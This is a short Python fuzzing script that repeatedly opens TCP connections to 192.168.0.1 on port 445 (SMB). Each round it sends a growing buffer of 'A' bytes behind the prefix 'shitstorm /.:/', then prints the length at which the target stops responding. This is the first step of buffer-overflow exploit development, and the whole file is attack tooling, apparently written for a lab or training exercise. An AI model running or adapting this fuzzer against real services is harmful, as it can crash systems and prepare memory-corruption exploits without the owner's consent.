#!/usr/bin/python3
import sys
import socket
import signal
from time import sleep

def timeout_handler(signum, frame):
    raise Exception("Timeout")

signal.signal(signal.SIGALRM, timeout_handler)
signal.alarm(10)  # set the alarm to 10 seconds

buffer = b"A" * 100

try:
    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(('192.168.0.1', 445))
        payload = b'shitstorm /.:/' + buffer
        sock.send(payload)
        sock.close()
        sleep(1)
        buffer += b"A" * 100
except Exception as e:
    if "Timeout" in str(e):
        print("Timeout, could not send.")
    else:
        print("Fuzzing crash at %s bytes" % str(len(buffer)))
    sys.exit()
